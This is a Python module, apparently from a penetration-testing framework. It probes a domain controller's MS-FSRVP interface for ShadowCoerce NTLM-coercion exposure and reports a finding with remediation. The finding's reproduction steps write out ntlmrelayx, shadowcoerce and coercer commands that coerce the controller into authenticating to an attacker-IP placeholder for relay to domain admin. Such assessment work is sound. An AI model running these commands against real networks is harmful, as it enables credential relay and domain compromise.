"""ShadowCoerce — MS-FSRVP coercion probe (safe negotiation only, no exploit)."""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_SHADOWCOERCE = "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_SHADOWCOERCE = "CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
# MS-FSRVP interface UUID
FSRVP_UUID = "a8e0653c-2744-4389-a61d-7373df8b2292"


class ShadowCoerce(BaseModule):
    """ShadowCoerce — test MS-FSRVP accessibility for NTLM coercion (safe probe)."""

    NAME        = "shadowcoerce"
    DESCRIPTION = "Probe MS-FSRVP (shadow copy) protocol for coercion attack surface — safe probe only"
    PHASE       = 4
    TAGS        = ["attacks", "coercion", "ntlm-relay", "ms-fsrvp", "mitre-T1187"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        dc_ip  = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        await asyncio.gather(
            self._probe_fsrvp_impacket(dc_ip, domain),
            self._check_smb_port(dc_ip),
        )
        return self._make_result(start)

    async def _probe_fsrvp_impacket(self, dc_ip: str, domain: str) -> None:
        """Attempt to bind to the FSRVP RPC interface — binding success = coercible."""
        try:
            from impacket.dcerpc.v5 import transport, epm
            from impacket.uuid import uuidtup_to_bin

            string_binding = f"ncacn_np:{dc_ip}[\\pipe\\FssagentRpc]"
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.setRemoteHost(dc_ip)

            # Attempt connection with credentials if available
            user   = self.config.extra.get("username", "")
            passwd = self.config.extra.get("password", "")
            if user:
                rpctransport.set_credentials(user, passwd, domain, "", "", None)

            dce = rpctransport.get_dce_rpc()
            await asyncio.get_event_loop().run_in_executor(None, dce.connect)

            # Bind to FSRVP interface
            iface = uuidtup_to_bin((FSRVP_UUID, "1.0"))
            await asyncio.get_event_loop().run_in_executor(
                None, lambda: dce.bind(iface)
            )

            # If bind succeeds, FSRVP is accessible — this confirms coercion surface
            self._report_vulnerable(dc_ip, domain, method="impacket RPC bind")
            dce.disconnect()

        except ImportError:
            self.log.debug("impacket not available — falling back to port check")
        except Exception as exc:
            err = str(exc).lower()
            if "access_denied" in err or "logon_failure" in err:
                # Access denied means the interface EXISTS but requires auth — still flag
                self._report_vulnerable(dc_ip, domain, method="impacket RPC (access denied = interface reachable)")
            else:
                self.log.debug("FSRVP probe: %s", exc)

    async def _check_smb_port(self, dc_ip: str) -> None:
        """Fallback: verify SMB (445) is open — prerequisite for MS-FSRVP."""
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(dc_ip, 445), timeout=5
            )
            writer.close()
            # SMB accessible — document manual verification needed
            self.log.info("SMB port 445 open on %s — MS-FSRVP may be accessible", dc_ip)
        except Exception:
            pass

    def _report_vulnerable(self, dc_ip: str, domain: str, method: str) -> None:
        ev = Evidence(extra={
            "dc_ip":        dc_ip,
            "protocol":     "MS-FSRVP",
            "interface":    FSRVP_UUID,
            "method":       method,
            "coerce_call":  "IsPathShadowCopied / IsPathSupported",
        })
        self.new_finding(
            title=f"ShadowCoerce — MS-FSRVP Coercion Surface on {dc_ip}",
            severity=Severity.HIGH,
            description=(
                f"MS-FSRVP (Shadow Copy) RPC interface is accessible on {dc_ip}. "
                "ShadowCoerce exploits the IsPathShadowCopied/IsPathSupported RPC calls to "
                "coerce the target machine into authenticating to an attacker-controlled server.\n\n"
                "Combined with NTLM relay (ntlmrelayx) and an unsigned SMB/HTTP target, "
                "this enables relay-to-DA without user interaction.\n\n"
                "This is an additional coercion vector alongside PetitPotam and PrintSpooler."
            ),
            reproduction_steps=[
                "# Setup relay listener:",
                "impacket-ntlmrelayx -t smb://<target_without_signing> --no-http-server -smb2support",
                "# Trigger coercion via ShadowCoerce:",
                f"python3 shadowcoerce.py -u lowpriv -p 'Pass' -d {domain} "
                "<attacker_ip> {dc_ip}",
                "# OR use coercer for all vectors at once:",
                f"coercer coerce -u lowpriv -p 'Pass' -d {domain} "
                f"-l <attacker_ip> -t {dc_ip} --always-continue",
            ],
            remediation=(
                "Disable the MS-FSRVP service (VSS Agent RPC) on DCs if not needed. "
                "Require SMB signing on ALL domain hosts to neutralize relay after coercion. "
                "Block outbound SMB from DCs to workstation subnets (firewall). "
                "Enable EPA on NTLM-accepting endpoints. "
                "Consider disabling NTLM entirely in the domain."
            ),
            references=[
                "ShadowCoerce research (2022)",
                "MITRE T1187",
                "https://github.com/ShutdownRepo/ShadowCoerce",
            ],
            evidence=ev,
            cvss_v31_vector=CVSS_SHADOWCOERCE,
            cvss_v40_vector=CVSS40_SHADOWCOERCE,
            mitre_attack=["TA0006/T1187", "TA0006/T1557.001"],
            target=dc_ip,
        )


class TestShadowCoerce:
    def test_cvss(self) -> None:
        assert CVSS_SHADOWCOERCE.startswith("CVSS:3.1")

    def test_uuid_format(self) -> None:
        assert len(FSRVP_UUID) == 36
